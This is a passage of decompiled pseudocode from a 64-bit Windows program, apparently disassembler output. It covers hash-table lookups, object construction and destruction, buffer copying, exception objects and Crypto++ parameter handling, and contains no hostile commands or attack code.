      v8 = 1099511628211i64 * (v10 ^ v8);
    }
    while ( v9 < v4 );
  }
  v11 = v6[5];
  v12 = v11 & (v8 ^ (v8 >> 32));
  if ( v6[6] <= v12 )
    v12 += -1i64 - (v11 >> 1);
  v13 = v6[2];
  v14 = (_QWORD *)*v6;
  v15 = *(_QWORD **)(v13 + 16 * v12);
  v16 = (_QWORD **)(v13 + 8 * (2 * v12 + 1));
  v17 = *(_QWORD **)(v13 + 16 * v12);
  for ( i = v13 + 8 * (2 * v12 + 1); ; v16 = (_QWORD **)i )
  {
    v18 = v15 == v14 ? v14 : **v16;
    if ( v17 == v18 )
      break;
    v19 = v17 + 2;
    if ( v3 < 0x10 )
      v20 = v5;
    else
      v20 = *v5;
    v21 = v17[4];
    if ( v17[5] >= 0x10ui64 )
      v19 = (_QWORD *)*v19;
    v22 = v4;
    if ( v21 < v4 )
      v22 = v17[4];
    if ( v22 )
      v23 = memcmp(v19, v20, v22);
    else
      v23 = 0;
    if ( !v23 )
    {
      if ( v21 < v4 )
        goto LABEL_26;
      v23 = v21 != v4;
    }
    if ( !v23 )
    {
      v24 = v17[4];
      v25 = v17 + 2;
      if ( v17[5] >= 0x10ui64 )
        v25 = (_QWORD *)*v25;
      if ( v3 >= 0x10 )
        v5 = (const void **)*v5;
      v26 = v17[4];
      if ( v4 < v24 )
        v26 = v4;
      if ( v26 )
        v27 = memcmp(v5, v25, v26);
      else
        v27 = 0;
      if ( v27 )
      {
LABEL_39:
        v30 = v17;
        if ( v27 )
          goto LABEL_40;
      }
      else
      {
        if ( v4 >= v24 )
        {
          LOBYTE(v7) = v4 != v24;
          v27 = v7;
          goto LABEL_39;
        }
LABEL_40:
        v30 = v14;
      }
      *v31 = v30;
      return v31;
    }
LABEL_26:
    v17 = (_QWORD *)*v17;
  }
  result = v31;
  *v31 = v14;
  return result;
}

//----- (0000000140022630) ----------------------------------------------------
_QWORD *__fastcall sub_140022630(_QWORD *a1, _QWORD *a2, __int64 a3)
{
  _QWORD *v3; // rbx
  __int64 v4; // rax

  v3 = a1;
  *a1 = &off_1400A57A0;
  a1[1] = off_1400A57F0;
  a1[2] = *a2;
  v4 = a2[1];
  a1[3] = v4;
  if ( v4 )
    _InterlockedIncrement((volatile signed __int32 *)(v4 + 8));
  a1[4] = a3;
  (*(void (__fastcall **)(__int64))(*(_QWORD *)a3 + 40i64))(a3);
  return v3;
}
// 1400A57A0: using guessed type __int64 (__fastcall *off_1400A57A0)(void *);
// 1400A57F0: using guessed type __int64 (__fastcall *off_1400A57F0[2])();

//----- (0000000140022690) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_140022690(_QWORD *a1))()
{
  _QWORD *v1; // rdi
  void (__fastcall ***v2)(_QWORD, signed __int64); // rcx
  volatile signed __int32 *v3; // rbx
  __int64 (__fastcall **result)(); // rax

  v1 = a1;
  *a1 = &off_1400A57A0;
  a1[1] = off_1400A57F0;
  v2 = (void (__fastcall ***)(_QWORD, signed __int64))a1[4];
  if ( v2 )
    (**v2)(v2, 1i64);
  v3 = (volatile signed __int32 *)v1[3];
  if ( v3 )
  {
    if ( !_InterlockedDecrement(v3 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v3 + 8i64))(v3);
      if ( !_InterlockedDecrement(v3 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v3 + 16i64))(v3);
    }
  }
  v1[1] = &off_1400B0E50;
  result = &off_1400A56B0;
  *v1 = &off_1400A56B0;
  return result;
}
// 1400A56B0: using guessed type __int64 (__fastcall *off_1400A56B0)();
// 1400A57A0: using guessed type __int64 (__fastcall *off_1400A57A0)(void *);
// 1400A57F0: using guessed type __int64 (__fastcall *off_1400A57F0[2])();
// 1400B0E50: using guessed type __int64 (__fastcall *off_1400B0E50)();

//----- (0000000140022728) ----------------------------------------------------
void *__fastcall sub_140022728(__int64 a1, char a2)
{
  return sub_140022740((void *)(a1 - 8), a2);
}

//----- (0000000140022740) ----------------------------------------------------
void *__fastcall sub_140022740(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140022690(a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140022770) ----------------------------------------------------
__int64 __fastcall sub_140022770(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 16) + 48i64))();
}

//----- (0000000140022780) ----------------------------------------------------
__int64 __fastcall sub_140022780(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a2;
  (*(void (__cdecl **)(_QWORD))(**(_QWORD **)(a1 + 16) + 64i64))(*(_QWORD *)(a1 + 16));
  return v2;
}

//----- (00000001400227B0) ----------------------------------------------------
__int64 __fastcall sub_1400227B0(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 16) + 40i64))();
}

//----- (00000001400227C0) ----------------------------------------------------
__int64 __fastcall sub_1400227C0(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 16) + 56i64))();
}

//----- (00000001400227D0) ----------------------------------------------------
__int64 __fastcall sub_1400227D0(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 16) + 16i64))();
}

//----- (00000001400227E0) ----------------------------------------------------
__int64 __fastcall sub_1400227E0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi

  v2 = a1;
  v3 = a2;
  (*(void (__fastcall **)(_QWORD, char *, __int64))(**(_QWORD **)(a1 + 24) + 8i64))(
    *(_QWORD *)(a1 + 24),
    byte_1400A3400,
    a2);
  return (*(__int64 (__fastcall **)(signed __int64, __int64))(*(_QWORD *)(*(_QWORD *)(v2 + 8) + 8i64) + 8i64))(
           *(_QWORD *)(v2 + 8) + 8i64,
           v3);
}

//----- (0000000140022830) ----------------------------------------------------
__int64 __fastcall sub_140022830(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 16) + 32i64))();
}

//----- (0000000140022A10) ----------------------------------------------------
__int64 __fastcall sub_140022A10(__int64 a1, __int64 a2, _DWORD *a3, char a4)
{
  char v4; // bp
  _DWORD *v5; // r14
  __int64 v6; // rsi
  __int64 v7; // rdi
  _QWORD *v8; // rax
  _QWORD *v9; // rbx
  __int64 v10; // r14
  void (__fastcall ***v11)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v12)(_QWORD, signed __int64); // rcx

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = operator new(0x28ui64);
  v9 = v8;
  if ( v8 )
  {
    v8[1] = v6;
    *((_BYTE *)v8 + 16) = v4;
    *((_BYTE *)v8 + 17) = 0;
    v8[3] = 0i64;
    *v8 = &off_1400A6710;
    *((_DWORD *)v8 + 8) = *v5;
  }
  else
  {
    v9 = 0i64;
  }
  v10 = *(_QWORD *)(v7 + 8);
  *(_QWORD *)(v7 + 8) = 0i64;
  v11 = (void (__fastcall ***)(_QWORD, signed __int64))v9[3];
  if ( v11 )
    (**v11)(v11, 1i64);
  v9[3] = v10;
  v12 = *(void (__fastcall ****)(_QWORD, signed __int64))(v7 + 8);
  if ( v12 )
    (**v12)(v12, 1i64);
  *(_QWORD *)(v7 + 8) = v9;
  *(_BYTE *)(v7 + 16) = v4;
  return v7;
}
// 1400A6710: using guessed type __int64 (__fastcall *off_1400A6710)(void *);

//----- (0000000140022AD0) ----------------------------------------------------
__int64 __fastcall sub_140022AD0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  char *v4; // rax
  _QWORD *v5; // rax
  _QWORD *v6; // rdx
  unsigned __int8 v7; // bl
  void *v9; // [rsp+28h] [rbp-50h]
  __int64 v10; // [rsp+38h] [rbp-40h]
  unsigned __int64 v11; // [rsp+40h] [rbp-38h]
  void *v12; // [rsp+48h] [rbp-30h]
  __int64 v13; // [rsp+58h] [rbp-20h]
  unsigned __int64 v14; // [rsp+60h] [rbp-18h]

  v2 = a2;
  v3 = a1;
  v11 = 15i64;
  v10 = 0i64;
  LOBYTE(v9) = 0;
  sub_140004F20(&v9, "ThisObject:", 0xBui64);
  v4 = (char *)type_info::_name_internal_method(
                 (type_info *)&CryptoPP::cls_111<CryptoPP::ModExpPrecomputation,CryptoPP::cls_112<CryptoPP::cls_097>> `RTTI Type Descriptor',
                 (struct __type_info_node *)&unk_1400DC648);
  v5 = sub_14000DAC0(&v12, &v9, v4);
  v6 = v5;
  if ( v5[3] >= 0x10ui64 )
    v6 = (_QWORD *)*v5;
  v7 = (*(__int64 (__fastcall **)(__int64, _QWORD *, void *(__fastcall ***)(type_info *, unsigned int), __int64, signed __int64))(*(_QWORD *)v3 + 8i64))(
         v3,
         v6,
         &CryptoPP::cls_111<CryptoPP::ModExpPrecomputation,CryptoPP::cls_112<CryptoPP::cls_097>> `RTTI Type Descriptor',
         v2,
         -2i64);
  if ( v14 >= 0x10 )
    operator delete(v12);
  v14 = 15i64;
  v13 = 0i64;
  LOBYTE(v12) = 0;
  if ( v11 >= 0x10 )
    operator delete(v9);
  return v7;
}
// 1400A17B8: using guessed type const char *type_info::_name_internal_method(type_info *__hidden this, struct __type_info_node *);
// 1400D8D90: using guessed type void *(__fastcall **CryptoPP::cls_111<CryptoPP::ModExpPrecomputation,CryptoPP::cls_112<CryptoPP::cls_097>> `RTTI Type Descriptor')(type_info *this, unsigned int);

//----- (0000000140022BD0) ----------------------------------------------------
__int64 __fastcall sub_140022BD0(__int64 a1, __int64 a2, _DWORD *a3, char a4)
{
  char v4; // bl
  _DWORD *v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v11; // [rsp+30h] [rbp-28h]
  void (__fastcall ***v12)(_QWORD, signed __int64); // [rsp+38h] [rbp-20h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = sub_140053D40((__int64)&v11);
  v9 = sub_140022A10(v8, v6, v5, v4);
  sub_140053CE0(v7, v9);
  if ( v12 )
    (**v12)(v12, 1i64);
  return v7;
}

//----- (0000000140022C60) ----------------------------------------------------
__int64 __fastcall sub_140022C60(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rsi
  __int64 i; // rbx

  v3 = a3;
  v4 = a2;
  for ( i = a1; i != v4; v3 += 40i64 )
  {
    sub_14003C670(v3, i);
    i += 40i64;
  }
  return v3;
}

//----- (0000000140022CB0) ----------------------------------------------------
__int64 __fastcall sub_140022CB0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *v3; // rdi
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400A6C38;
    *((_QWORD *)v4 + 2) = v2;
  }
  return sub_140029830(v3, v2, (__int64)v4);
}
// 1400A6C38: using guessed type __int64 (__fastcall *off_1400A6C38)();

//----- (0000000140022D20) ----------------------------------------------------
__int64 __fastcall sub_140022D20(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rsi
  __int64 i; // rdi

  v3 = a3;
  v4 = a2;
  for ( i = a1; i != v4; i += 40i64 )
  {
    if ( v3 )
      sub_14003C000(v3, i);
    v3 += 40i64;
  }
  return v3;
}

//----- (0000000140022D80) ----------------------------------------------------
__int64 __fastcall sub_140022D80(__int64 a1, __int64 a2)
{
  volatile signed __int32 *v2; // rbx
  __int64 result; // rax

  v2 = *(volatile signed __int32 **)(a2 + 8);
  if ( v2 && !_InterlockedDecrement(v2 + 2) )
  {
    result = (**(__int64 (__fastcall ***)(volatile signed __int32 *))v2)(v2);
    if ( !_InterlockedDecrement(v2 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
  }
  return result;
}

//----- (0000000140022DC0) ----------------------------------------------------
__int64 __fastcall sub_140022DC0(__int64 a1, int a2)
{
  __int64 v2; // rdi

  v2 = a1;
  if ( a2 )
    *(_QWORD *)(a1 + 16) = &unk_1400A6930;
  *(_DWORD *)(a1 + 24) = 0;
  sub_14003C210((void *)(a1 + 32));
  *(_QWORD *)v2 = &off_1400A67F0;
  *(_QWORD *)(v2 + 8) = &off_1400A6830;
  *(_QWORD *)(*(signed int *)(*(_QWORD *)(v2 + 16) + 4i64) + v2 + 16) = off_1400A68D8;
  *(_DWORD *)(*(signed int *)(*(_QWORD *)(v2 + 16) + 4i64) + v2 + 12) = 0;
  *(_QWORD *)(v2 + 72) = off_1400A67C0;
  *(_QWORD *)(v2 + 80) = 0i64;
  *(_QWORD *)(v2 + 88) = off_1400A6780;
  sub_14003C210((void *)(v2 + 96));
  *(_DWORD *)(v2 + 136) = 0;
  sub_14003C210((void *)(v2 + 144));
  *(_QWORD *)(v2 + 184) = 0i64;
  *(_QWORD *)(v2 + 192) = 0i64;
  *(_QWORD *)(v2 + 200) = 0i64;
  return v2;
}
// 1400A6780: using guessed type __int64 (__fastcall *off_1400A6780[7])();
// 1400A67C0: using guessed type __int64 (__fastcall *off_1400A67C0[6])();
// 1400A67F0: using guessed type __int64 (__fastcall *off_1400A67F0)(void *);
// 1400A6830: using guessed type void *off_1400A6830;
// 1400A68D8: using guessed type __int64 (__fastcall *off_1400A68D8[11])();

//----- (0000000140022E80) ----------------------------------------------------
__int64 __fastcall sub_140022E80(__int64 a1, const void *a2, unsigned __int64 a3)
{
  __int64 v3; // rbx
  size_t v4; // rdi
  const void *v5; // rsi
  void *v6; // rax
  __int64 result; // rax
  size_t v8; // r8

  v3 = a1;
  *(_QWORD *)(a1 + 8) = a3;
  v4 = a3;
  v5 = a2;
  sub_1400255A0(a3);
  if ( v4 )
    v6 = sub_14003A000(v4);
  else
    v6 = 0i64;
  *(_QWORD *)(v3 + 16) = v6;
  if ( v5 && v6 )
  {
    memcpy_s(v6, *(_QWORD *)(v3 + 8), v5, v4);
    result = v3;
  }
  else
  {
    v8 = *(_QWORD *)(v3 + 8);
    if ( v8 )
      memset(v6, 0, v8);
    result = v3;
  }
  return result;
}

//----- (0000000140022F10) ----------------------------------------------------
__int64 __fastcall sub_140022F10(__int64 a1, unsigned __int64 a2)
{
  __int64 v2; // rbx
  size_t v3; // rdi

  v2 = a1;
  *(_QWORD *)(a1 + 8) = a2;
  v3 = a2;
  sub_1400255A0(a2);
  if ( v3 )
    *(_QWORD *)(v2 + 16) = sub_14003A000(v3);
  else
    *(_QWORD *)(v2 + 16) = 0i64;
  return v2;
}

//----- (0000000140022F60) ----------------------------------------------------
__int64 __fastcall sub_140022F60(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  __int64 v4; // rsi
  void *v5; // rax
  const void *v6; // r8

  v2 = a1;
  v3 = a2;
  *(_QWORD *)(a1 + 8) = *(_QWORD *)(a2 + 8);
  v4 = *(_QWORD *)(a2 + 8);
  sub_140025670(*(_QWORD *)(a2 + 8));
  if ( v4 )
    v5 = sub_14003A000(8 * v4);
  else
    v5 = 0i64;
  *(_QWORD *)(v2 + 16) = v5;
  v6 = *(const void **)(v3 + 16);
  if ( v6 )
    memcpy_s(v5, 8i64 * *(_QWORD *)(v2 + 8), v6, 8i64 * *(_QWORD *)(v3 + 8));
  return v2;
}

//----- (0000000140022FE0) ----------------------------------------------------
__int64 __fastcall sub_140022FE0(__int64 a1, char a2)
{
  char v2; // di
  __int64 v3; // rbx
  signed int v4; // eax

  v2 = a2;
  v3 = a1;
  std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(a1);
  *(_QWORD *)v3 = &off_1400A6430;
  v4 = 0;
  if ( !(v2 & 1) )
    v4 = 4;
  if ( !(v2 & 2) )
    v4 |= 2u;
  if ( v2 & 8 )
    v4 |= 8u;
  if ( v2 & 4 )
    v4 |= 0x10u;
  *(_QWORD *)(v3 + 104) = 0i64;
  *(_DWORD *)(v3 + 112) = v4;
  return v3;
}
// 1400A16B8: using guessed type __int64 __cdecl std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(_QWORD);
// 1400A6430: using guessed type __int64 (__fastcall *off_1400A6430)(void *);

//----- (0000000140023050) ----------------------------------------------------
__int64 __fastcall sub_140023050(__int64 a1, __int64 a2, const char *a3, __int64 a4, _QWORD *a5, __int64 a6)
{
  __int64 v6; // r13
  __int64 v7; // rbx
  __int64 v8; // rbp
  char *v9; // rdi
  _QWORD *v10; // rdi
  char *v11; // rax
  size_t v12; // r8
  _QWORD *v13; // rax
  _QWORD *v14; // rdi
  size_t v15; // r8
  unsigned __int64 v16; // rsi
  unsigned __int64 v17; // rax
  _QWORD *v18; // rax
  bool v19; // cf
  unsigned __int8 *v20; // rdi
  const char *v21; // rax
  unsigned __int8 *v22; // rdx
  signed __int64 v23; // rax
  int v24; // er8
  int v25; // er9

  *(_QWORD *)a1 = a2;
  v6 = a2;
  v7 = a1;
  *(_QWORD *)(a1 + 8) = a3;
  *(_QWORD *)(a1 + 16) = a4;
  *(_QWORD *)(a1 + 24) = a5;
  *(_WORD *)(a1 + 32) = 0;
  v8 = a4;
  v9 = (char *)a3;
  if ( strcmp(a3, "ValueNames") )
    goto LABEL_26;
  *(_WORD *)(v7 + 32) = 257;
  sub_1400293A0(
    v9,
    (__int64)&std::basic_string<char,std::char_traits<char>,std::allocator<char>> `RTTI Type Descriptor',
    v8);
  if ( a6 )
    (*(void (__fastcall **)(__int64, _QWORD, __int64, _QWORD *))(*(_QWORD *)a6 + 8i64))(a6, *(_QWORD *)(v7 + 8), v8, a5);
  if ( (unsigned __int8)type_info::operator!=(
                          &CryptoPP::cls_114 `RTTI Type Descriptor',
                          &CryptoPP::cls_113 `RTTI Type Descriptor') )
    sub_140055E50(v6 + 80, *(const char **)(v7 + 8), v8, a5);
  v10 = sub_140004CA0(*(void **)(v7 + 24), "ThisPointer:", 0xCui64);
  v11 = (char *)type_info::_name_internal_method(
                  (type_info *)&CryptoPP::cls_114 `RTTI Type Descriptor',
                  (struct __type_info_node *)&unk_1400DC648);
  if ( *v11 )
  {
    v12 = -1i64;
    do
      ++v12;
    while ( v11[v12] );
  }
  else
  {
    v12 = 0i64;
  }
  v13 = sub_140004CA0(v10, v11, v12);
  v14 = v13;
  v15 = v13[2];
  if ( -1i64 - v15 <= 1 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v16 = v15 + 1;
  if ( v15 + 1 > 0xFFFFFFFFFFFFFFFEui64 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v17 = v13[3];
  if ( v17 < v16 )
  {
    sub_140004790(v14, v16, v15);
    if ( !v16 )
      goto LABEL_26;
    goto LABEL_16;
  }
  if ( v16 )
  {
LABEL_16:
    if ( v14[3] < 0x10ui64 )
      v18 = v14;
    else
      v18 = (_QWORD *)*v14;
    *((_BYTE *)v18 + v14[2]) = 59;
    v19 = v14[3] < 0x10ui64;
    v14[2] = v16;
    if ( !v19 )
      v14 = (_QWORD *)*v14;
    *((_BYTE *)v14 + v16) = 0;
    goto LABEL_26;
  }
  v14[2] = 0i64;
  if ( v17 >= 0x10 )
    v14 = (_QWORD *)*v14;
  *(_BYTE *)v14 = 0;
LABEL_26:
  if ( !*(_BYTE *)(v7 + 32) )
  {
    if ( strncmp(*(const char **)(v7 + 8), "ThisPointer:", 0xCui64) )
      goto LABEL_42;
    v20 = *(unsigned __int8 **)(v7 + 8);
    v21 = type_info::_name_internal_method(
            (type_info *)&CryptoPP::cls_114 `RTTI Type Descriptor',
            (struct __type_info_node *)&unk_1400DC648);
    v22 = v20 + 12;
    v23 = v21 - (const char *)(v20 + 12);
    do
    {
      v24 = v22[v23];
      v25 = *v22 - v24;
      if ( *v22 != v24 )
        break;
      ++v22;
    }
    while ( v24 );
    if ( v25 )
    {
LABEL_42:
      if ( !*(_BYTE *)(v7 + 32) )
      {
        if ( a6 )
          *(_BYTE *)(v7 + 32) = (*(__int64 (__fastcall **)(__int64, _QWORD, __int64, _QWORD *))(*(_QWORD *)a6 + 8i64))(
                                  a6,
                                  *(_QWORD *)(v7 + 8),
                                  v8,
                                  a5);
        if ( !*(_BYTE *)(v7 + 32)
          && (unsigned __int8)type_info::operator!=(
                                &CryptoPP::cls_114 `RTTI Type Descriptor',
                                &CryptoPP::cls_113 `RTTI Type Descriptor') )
        {
          *(_BYTE *)(v7 + 32) = sub_140055E50(v6 + 80, *(const char **)(v7 + 8), v8, a5);
        }
      }
    }
    else
    {
      sub_1400293A0(v20, (__int64)&CryptoPP::cls_114 * `RTTI Type Descriptor', *(_QWORD *)(v7 + 16));
      *a5 = v6;
      *(_BYTE *)(v7 + 32) = 1;
    }
  }
  return v7;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A17B8: using guessed type const char *type_info::_name_internal_method(type_info *__hidden this, struct __type_info_node *);
// 1400A1920: using guessed type __int64 __fastcall type_info::operator!=(_QWORD, _QWORD);
// 1400D8E00: using guessed type void *(__fastcall **std::basic_string<char,std::char_traits<char>,std::allocator<char>> `RTTI Type Descriptor')(type_info *this, unsigned int);
// 1400D8E80: using guessed type struct CryptoPP::cls_114 *CryptoPP::cls_114 * `RTTI Type Descriptor';

//----- (00000001400233A0) ----------------------------------------------------
_QWORD *__fastcall sub_1400233A0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *v3; // rdi

  v2 = a2;
  v3 = a1;
  a1[1] = &off_1400A64C0;
  a1[2] = a1;
  *a1 = &off_1400A6528;
  sub_14003C000((__int64)(a1 + 3), a2 + 24);
  sub_14003BE30((__int64)(v3 + 8), 0i64, *(_QWORD *)(v2 + 40));
  sub_14003C210(v3 + 13);
  return v3;
}
// 1400A64C0: using guessed type __int64 (__fastcall *off_1400A64C0)();
// 1400A6528: using guessed type __int64 (__fastcall *off_1400A6528)(void *);

//----- (0000000140023410) ----------------------------------------------------
_QWORD *__fastcall sub_140023410(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *v3; // rdi

  v2 = a2;
  v3 = a1;
  a1[1] = &off_1400A64C0;
  a1[2] = a1;
  *a1 = &off_1400A6528;
  sub_14003C000((__int64)(a1 + 3), a2);
  sub_14003BE30((__int64)(v3 + 8), 0i64, *(_QWORD *)(v2 + 16));
  sub_14003C210(v3 + 13);
  return v3;
}
// 1400A64C0: using guessed type __int64 (__fastcall *off_1400A64C0)();
// 1400A6528: using guessed type __int64 (__fastcall *off_1400A6528)(void *);

//----- (0000000140023480) ----------------------------------------------------
_QWORD *__fastcall sub_140023480(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_1400233A0(a1, a2);
  *v3 = &off_1400A6600;
  sub_14003C000((__int64)(v3 + 18), v2 + 144);
  sub_140022F60((__int64)(v3 + 23), v2 + 184);
  return v3;
}
// 1400A6600: using guessed type __int64 (__fastcall *off_1400A6600)(void *);

//----- (00000001400234F0) ----------------------------------------------------
std::exception *__fastcall sub_1400234F0(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = *((_DWORD *)v2 + 6);
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, (_QWORD *)v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140023560) ----------------------------------------------------
std::exception *__fastcall sub_140023560(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = *((_DWORD *)v2 + 6);
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, (_QWORD *)v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (00000001400235E0) ----------------------------------------------------
std::exception *__fastcall sub_1400235E0(std::exception *a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = 1;
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, v2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140023660) ----------------------------------------------------
std::exception *__fastcall sub_140023660(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = *((_DWORD *)v2 + 6);
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, (_QWORD *)v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (00000001400236E0) ----------------------------------------------------
std::exception *__fastcall sub_1400236E0(std::exception *a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = 4;
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, v2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140023760) ----------------------------------------------------
std::exception *__fastcall sub_140023760(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = *((_DWORD *)v2 + 6);
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, (_QWORD *)v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (00000001400237E0) ----------------------------------------------------
std::exception *__fastcall sub_1400237E0(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140023560(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_QWORD *)v3 + 8) = *((_QWORD *)v2 + 8);
  *((_QWORD *)v3 + 9) = *((_QWORD *)v2 + 9);
  return v3;
}
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140023820) ----------------------------------------------------
__int64 __fastcall sub_140023820(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdi
  __int64 v5; // rsi
  __int64 v6; // rbx
  signed __int64 v7; // rcx
  void *v9; // [rsp+30h] [rbp-38h]
  __int64 v10; // [rsp+40h] [rbp-28h]
  unsigned __int64 v11; // [rsp+48h] [rbp-20h]

  v4 = a4;
  v5 = a3;
  v6 = a1;
  v11 = 15i64;
  v10 = 0i64;
  LOBYTE(v9) = 0;
  sub_140004F20(&v9, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v6);
  *(_QWORD *)v6 = &off_1400A8798;
  *(_DWORD *)(v6 + 24) = 1;
